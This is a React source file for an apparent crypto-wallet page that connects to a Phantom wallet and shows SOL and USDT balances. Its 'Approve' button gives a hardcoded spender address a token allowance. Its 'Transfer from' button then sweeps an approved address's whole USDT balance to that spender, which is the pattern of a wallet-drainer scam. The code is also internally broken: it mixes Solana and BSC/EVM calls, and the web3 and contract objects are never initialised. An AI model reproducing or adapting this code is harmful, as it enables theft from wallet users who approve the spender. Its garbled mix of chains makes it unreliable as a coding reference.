import { useEffect, useState } from 'react'
import * as Web3 from '@solana/web3.js'
import * as splToken from '@solana/spl-token'
import Toast from 'light-toast'
import Btn from './components/Btn'
import Ipt from './components/Ipt'
import ABI from './config/USDT_BEP20_ABI.json'
import { formatBalance } from './config/utils'

const USDT_BEP20_ADDRESS = '0x55d398326f99059ff775485246999027b3197955'
const SPENDER_ADDRESS = '0xf2d50314B68D9a0338E6139603ca12dfffe11498'

let web3 = null, connection = null, publicKey = null, tokenAccount = null, contract = null, decimals = 6, timer = null
function App() {
	const [ rate, setRate ] = useState({
		'bitcoin': {usd: 51791, cny: 329750},
		'ethereum': {usd: 4400.49, cny: 28017},
		'litecoin': {usd: 163.13, cny: 1038.61},
		'tether': {usd: 0.999824, cny: 6.37},
		'tron': {usd: 0.091731, cny: 0.584041},
		'binancecoin': {usd: 593.87, cny: 3785.58},
		'usd-coin': {usd: 0.998926, cny: 6.36}
	})
	const [ address, setAddress ] = useState('')
	const [ solanaBalance, setSolanaBalance ] = useState(0)
	const [ usdtBalance, setUsdtBalance ] = useState(0)
	const [ gasFee, setGasFee ] = useState(0)

	const [ from, setFrom ] = useState('')
	const [ to, setTo ] = useState('')

	/**
	 * 初始化
	 */
	const init = async () => {
		if (window.solana && window.solana.isPhantom) {
			console.log(window.solana)
			try {
				const resp = await window.solana.connect()
				publicKey = resp.publicKey
				setAddress(publicKey.toString())
				connection = new Web3.Connection(Web3.clusterApiUrl('mainnet-beta'))
				console.log(connection)
				const res = await Web3.PublicKey.findProgramAddress([
					publicKey.toBuffer(), 
					splToken.TOKEN_PROGRAM_ID.toBuffer(), 
					new Web3.PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v').toBuffer()
				], new Web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'))
				tokenAccount = res[0]
				console.log(tokenAccount.toString())

				//This fromWallet is your minting wallet, that will actually mint the tokens
				// const fromWallet = Web3.Keypair.generate()
				//create new token mint
				// const mint = await splToken.Token.createMint(
				// 	connection,
				// 	fromWallet,
				// 	fromWallet.publicKey,
				// 	fromWallet.publicKey,
				// 	6, // Number of decimal places in your token
				// 	splToken.TOKEN_PROGRAM_ID,
				// )
				// console.log(mint)
				//get the token account of the myWallet myToken address, if it does not exist, create it
				// let myWalletTokenAccount = await myToken.getOrCreateAssociatedAccountInfo(
				// 	myWallet.publicKey,
				// );
				refresh()
				// getGasFee()
				// timer = setInterval(getGasFee, 5000)
			} catch (err) {
				console.log(err)
			}
		} else {
			Toast.fail('Phantom & solana not found!')
		}
	}

	const refresh = async (loading = false) => {
		loading && Toast.loading('Loading...')
		const solanaBalance = await connection.getBalance(publicKey)
		setSolanaBalance(solanaBalance)
		const res = await connection.getTokenAccountBalance(tokenAccount)
		console.log(res)
		// setUsdtBalance(usdtB / Math.pow(10, decimals))
		Toast.hide()
	}

	const getGasFee = async () => {
		const gasPrice = await web3.eth.getGasPrice()
		const fee = 80000 * +(web3.utils.fromWei(gasPrice, 'ether'))
		setGasFee(fee)
	}

	const getRate = () => {
		fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,usd-coin,litecoin,tron,binancecoin&vs_currencies=usd,cny`)
			.then(res => res.json())
			.then(res => {
				setRate(res)
				const r = {
					ts: new Date().getTime(),
					value: res
				}
				localStorage.setItem('rate', JSON.stringify(r))
			})
	}

	useEffect(() => {
		Toast.loading('Loading...')
		const rate1 = localStorage.getItem('rate')
		if (rate1) {
			const r = JSON.parse(rate1)
			setRate(r.value)
			if ((+r.ts - new Date().getTime()) > 3600000 * 6) {
				getRate()
			}
		} else {
			getRate()
		}
		
		setTimeout(() => init(), 500)
		return () => {
			clearInterval(timer)
			timer = null
		}
	}, [])

	return (
		<div className="w-full flex flex-col items-center p-4">
			<h1 className="text-4xl text-red-500 text-center font-bold pt-4">Solana</h1>
			<div className="py-3 text-center text-sm text-gray-600">
				<div>Address: <span className="text-blue-500">{address}</span></div>
				<div>Balance:  <span className="text-red-500 mx-2">{solanaBalance} SOL</span>| <span className="text-green-500 ml-2">{formatBalance(usdtBalance)} USDT</span></div>
				<div style={{ animation: 'fade 1s infinite' }}>
					Estimated gas fee: 
					<span className="text-yellow-500 ml-2">{formatBalance(gasFee)} SOL</span>
					<span className="mx-2">(${formatBalance(+gasFee * rate['binancecoin'].usd, 2)})</span>
					<span>(¥{formatBalance(+gasFee * rate['binancecoin'].cny, 2)})</span>
				</div>
			</div>
			<Btn text={'Refresh'} onClick={() => refresh(true)} />
			<Btn 
				text={'Approve'} 
				theme={'green'} 
				onClick={async () => {
					const allowanceBalance = await contract.methods.allowance(address, SPENDER_ADDRESS).call()
					console.log(allowanceBalance)
					if (allowanceBalance > 0) {
						return Toast.success('You have done!')
					}
					const res = await contract.methods.approve(SPENDER_ADDRESS, '99999999').send({
						from: address,
						gas: 80000
					})
					if (res.code === 4001) {
						return Toast.fail(res.message)
					}
					Toast.success('Success!')
				}} 
			/>
			<Ipt 
				placeholder={'From (Approved)'} 
				value={from} 
				onChange={(e) => {
					setFrom(e.target.value)
				}} 
			/>
			<Ipt 
				placeholder={'To'} 
				value={to} 
				onChange={(e) => {
					setTo(e.target.value)
				}}
			/>
			<Btn 
				text={'Get allowance'} 
				theme={'yellow'} 
				onClick={async () => {
					// // if (!from.trim()) {
					// // 	Toast.fail('From address is required!')
					// // 	return
					// // }
					if (from && !web3.utils.isAddress(from.trim())) {
						Toast.fail('From address is invalid!')
						return
					}
					const allowanceBalance = await contract.methods.allowance(from || address, SPENDER_ADDRESS).call()
					Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${allowanceBalance}`)
				}} 
			/>
			<Btn 
				text={'Transfer from'} 
				theme={'yellow'} 
				onClick={async () => {
					if (from && !web3.utils.isAddress(from.trim())) {
						Toast.fail('From address is invalid!')
						return
					}
					const toAddress = to || SPENDER_ADDRESS
					const balance = await contract.methods.balanceOf(from || address).call()
					alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
					Toast.loading('Loading...')
					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
					// // const res = await contract.transfer(toAddress, balance).send()
					console.log(res)
					Toast.hide()
					setTimeout(() => {
						refresh()
					}, 3000)
					
				}}
			/>
		</div>
	)
}

export default App
